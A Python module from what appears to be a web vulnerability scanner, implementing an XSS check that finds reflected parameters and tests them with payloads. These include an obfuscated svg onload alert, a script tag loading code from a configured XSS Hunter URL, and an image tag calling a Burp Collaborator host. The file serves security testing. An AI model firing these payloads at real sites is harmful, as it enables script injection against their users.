
from core.scan.module import *


class XSS(GeneralScanner):

    def __init__(self, config) -> None:
        GeneralScanner.__init__(self, config)

    def check(self):
        params = self.request.GetParams()
        counter = 0

        for p in params:
            params[p] = f"Hello{str(counter)}"
            counter += 1

        self.request.SetParams(params)
        res = self.request.Send()
        ret = False

        for i in range(len(params)):
            value = f"Hello{str(i)}"
            if value in res.text:
                # Get key by value 
                vulnerable_param = list(params.keys())[list(params.values()).index(value)]
                self.vulnerable_params.append(vulnerable_param)
                ret = True

        return ret
        
    def GetPayloads(self):
        xsshunter    = self.options.get('xsshunter')
        collaborator = self.options.get('collaborator')

        payloads = [
            '"><svg onload=alert&#0000000040`XSSB00M`)>'
        ]

        if xsshunter:
            payloads.append(f"\"><sCRiPt src={xsshunter}></ScrIpT>")

        if collaborator:
            host = urlparse(collaborator).netloc
            payloads.append(f"<ImG sRc=\"http://{host}\">")

        return payloads

    def is_vulnerable(self, res) -> bool:
        for payload in self.GetPayloads():
            if payload in res.text and self._is_valid_xss_response(res):
                return True

        return False

    def _is_valid_xss_response(self,response):
        return 'text' in response.headers.get('Content-Type')
